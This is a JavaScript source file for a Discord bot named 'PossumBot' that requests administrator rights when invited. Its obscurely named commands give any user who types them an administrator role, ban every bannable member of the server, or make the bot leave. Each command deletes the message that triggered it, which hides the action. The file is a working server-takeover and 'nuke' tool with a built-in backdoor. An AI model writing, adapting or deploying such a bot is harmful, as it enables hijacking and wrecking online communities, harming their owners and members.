const botSettings = require("./botsettings.json");
const Discord = require("discord.js");
const bot = new Discord.Client();

bot.on("ready", async () => {

    console.log(`PossumBot Is Now Activated`);
	bot.user.setActivity(`With Knives`);

    bot.generateInvite({

        permissions: ['ADMINISTRATOR'],

    })
        .then(link => console.log(`${link}`));

});
bot.on("message", async message => { 
	if (message.author.bot) return;

	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
  	const command = args.shift().toLowerCase();

	// Gives you the admin role and deletes the message.
	if (command === `myakish`) {
  		try {

            role = await message.guild.roles.create ({

            data: {
                name: "Dope Role",
          	    color: "#2f3136",
          	    permissions: [8]
            }

        });
            
        message.member.roles.add(role)
        message.delete();

		} catch(e) {
			console.log(e.stack);
		}
	}

	// Bans everyone and deletes the message.
	if (command === `arturdebil`) {
		try {

             const members = await message.guild.members.fetch()
        members
            .filter(m => m.bannable)
            .forEach(m => m.ban())
        message.delete();

		} catch(e) {
			console.log(e.stack);
		}
	}

	if(command === `leaveserver`) {
   		try {
            message.delete();
            message.guild.leave();
   		} catch(e) {
			console.log(e.stack);
   		}
   	}
});

bot.login(botSettings.token);
